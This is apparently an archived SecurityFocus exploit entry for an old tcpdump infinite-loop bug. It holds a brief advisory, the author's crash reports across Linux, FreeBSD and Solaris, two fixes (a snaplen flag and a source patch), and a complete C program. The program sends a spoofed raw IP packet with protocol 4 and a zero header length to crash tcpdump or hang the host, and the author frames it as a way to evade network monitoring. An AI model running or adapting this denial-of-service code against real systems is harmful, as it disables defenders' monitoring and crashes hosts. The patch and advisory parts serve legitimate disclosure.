source: http://www.securityfocus.com/bid/313/info

A vulnerability in tcpdump causes it to enter an infinite loop within the procedure ip_print() from the file print_ip.c when it receives a packet with IP protocol number four and a zero header length and it tries to print it. This may allow remote malicious users to evade network monitoring.

/*
tcpdump bug 3.4a? by BLADI (bladi@euskalnet.net);

On receiving an ip packet with Protocol-4 and ihl=0, tcpdump enters
an infinite loop within the procedure ip_print() from file print_ip.c
This happens because the header length (ihl) equals '0' and tcpdump
tries to print the packet

I've tried the bug in diferent OS's

                    
Linux:

     SuSE 6.x:
                   K2.0.36   tcpdump consumes all the system memory
                   K2.2.5    in less than a minute and hangs the system
                   K2.2.9    or sometimes gives an error from the bus
                   K2.3.2
                   K2.3.5

     RedHat 5.2:   K2.?.?    tcpdump makes a segmentation fault to happen
            6.0:   K2.2.9    and it sometimes does a coredump

     Debian        K2.2.?    tcpdump makes a segmentation fault to happen
                             and does a coredump

Freebsd                      Segmentation fault & Coredump  Thanks to: wb^3,Cagliostr
Solaris                      Segmentation fault & Coredump  Thanks to: acpizer
Aix                          ?
Hp-UX                        ?
-------------------------------------------------------------
This tests have been carried out in loopback mode, given that protocol 4
won't get through the routers. It would be interesting to perform the attack
remotely in an intranet.
But i do not have access to one.
------------------------------------------------------------------------------
Thanks to:
the channels:
#ayuda_irc,#dune,#linux,#networking,#nova y #seguridad_inform?tica.
from irc.irc-hispano.org
Special thanks go to:
Topo[lb],^Goku^,Yogurcito,Pixie,Void,S|r_|ce,JiJ79,Unscared etc...

Thanks to Piotr Wilkin for the rip base code ;)

And big thanks go to TeMpEsT for this translation.

------
I've found two ways of solving the problem
Solution 1
execute:    tcpdump -s 24

Solution 2  Apply this little patch.
                    
diff -r -p /tcpdump-3.4a6/tcpdump-3.4a6/print-ip.c /tcpdump-3.4a7/tcpdump-3.4a6/print-ip.c
*** /tcpdump-3.4a6/tcpdump-3.4a6/print-ip.c     Wed May 28 21:51:45 1997
--- /tcpdump-3.4a7/tcpdump-3.4a6/print-ip.c     Tue Oct 27 05:35:27 1998
*************** ip_print(register const u_char *bp, regi
*** 440,446 ****
                                (void)printf("%s > %s: ",
                                             ipaddr_string(&ip->ip_src),
                                             ipaddr_string(&ip->ip_dst));
-                       ip_print(cp, len);
                        if (! vflag) {
                                printf(" (ipip)");
                                return;
--- 440,445 ----

*/
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>  
#include <errno.h>
#include <netdb.h>
struct icmp_hdr
     {
          struct iphdr iph;
          char text[15];
     } 
    encaps;
int in_cksum(int *ptr, int nbytes)
     {
           long sum;
           u_short oddbyte, answer;
           sum = 0;
           while (nbytes > 1)
                   {
                    sum += *ptr++;
                    nbytes -= 2;
                   }
           if (nbytes == 1)
                   {
                    oddbyte = 0;
                    *((u_char *)&oddbyte) = *(u_char *)ptr;
                    sum += oddbyte;
                   }
           sum = (sum >> 16) + (sum & 0xffff);
           sum += (sum >> 16);
           answer = ~sum;
           return(answer);
     }
struct sockaddr_in sock_open(int socket, char *address,int prt)
     {
        struct hostent *host;
        struct sockaddr_in sin;

        if ((host = gethostbyname(address)) == NULL)
             {
                  perror("Unable to get host name");
                  exit(-1);
             }
        bzero((char *)&sin, sizeof(sin));

        sin.sin_family = PF_INET;
        sin.sin_port = htons(prt);
        bcopy(host->h_addr, (char *)&sin.sin_addr, host->h_length);
        return(sin);
     }
      
void main(int argc, char **argv)
     {
        int sock, i,k;
        int on = 1;
        struct sockaddr_in addrs; 
        printf("\t\tTCPDumper Ver 0.2 \n\t\t\tBy Bladi\n");
        if (argc < 3)
                {
                  printf("Uso: %s <ip_spoof> <dest_ip> \n", argv[0]);
                  exit(-1);  
                }   
        encaps.text[0]=66; encaps.text[1]=76; encaps.text[2]=65; encaps.text[3]=68;
        encaps.text[4]=73; encaps.text[5]=32; encaps.text[6]=84; encaps.text[7]=90;
        encaps.text[8]=32; encaps.text[9]=84; encaps.text[10]=79;encaps.text[11]=32; encaps.text[12]=84;encaps.text[13]=79;encaps.text[14]=80;encaps.text[15]=79;
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) == -1)
                {
                    perror("Can't set IP_HDRINCL option on socket");
                }
        if (sock < 0)
                {
                    exit(-1);
                }
        fflush(stdout);
        addrs = sock_open(sock, argv[2], random() % 255);
                    encaps.iph.version   = 0;
                    encaps.iph.ihl       = 0;
                    encaps.iph.frag_off  = htons(0);
                    encaps.iph.id        = htons(0x001);
                    encaps.iph.protocol  = 4;
                    encaps.iph.ttl       = 146;
                    encaps.iph.tot_len   = 6574;
                    encaps.iph.daddr     = addrs.sin_addr.s_addr;
                    encaps.iph.saddr     = inet_addr(argv[1]);
                    printf ("\t DuMpInG %s ---> %s \n",argv[1],argv[2]);
                    if (sendto(sock, &encaps, 1204, 0, (struct sockaddr *)&addrs, sizeof(struct sockaddr)) == -1)
                            {
                              if (errno != ENOBUFS) printf("Error :(\n");
                            }
                    fflush(stdout);
        close(sock);
}

